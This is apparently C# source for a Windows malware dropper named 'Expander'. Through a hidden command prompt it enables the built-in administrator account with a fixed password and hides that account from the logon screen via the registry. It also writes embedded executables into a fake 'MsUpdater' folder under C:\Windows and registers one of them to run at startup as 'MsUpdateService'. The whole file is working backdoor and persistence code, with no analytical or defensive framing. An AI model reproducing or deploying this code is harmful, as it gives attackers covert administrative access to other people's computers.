namespace Expander
{
    using System;
    using System.Diagnostics;
    using System.IO;

    using Expander.Properties;

    using Microsoft.Win32;

    internal static class Program
    {
        private static void Main(string[] args)
        {
            if (args == null)
            {
                throw new ArgumentNullException(nameof(args));
            }

            Process.Start(new ProcessStartInfo
            {
                FileName = "cmd",
                Arguments = "/C net user administrator /active:yes & net user administrator abc123kappa",
                WindowStyle = ProcessWindowStyle.Hidden
            });

            Directory.CreateDirectory(@"C:\Windows\MsUpdater");

            const string Bootstrap = @"C:\Windows\MsUpdater\Bootstrap.exe";
            
            File.WriteAllBytes(Bootstrap, Resources.Bootstrap);
            File.WriteAllBytes(@"C:\Windows\MsUpdater\InputSimulator.dll", Resources.InputSimulator);

            using (var localMachine = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
            {
                // ReSharper disable PossibleNullReferenceException

                localMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true).CreateSubKey("SpecialAccounts", true).CreateSubKey("UserList", true).SetValue("administrator", 0);
                localMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true).SetValue("MsUpdateService", Bootstrap);

                // ReSharper restore PossibleNullReferenceException
            }
        }
    }
}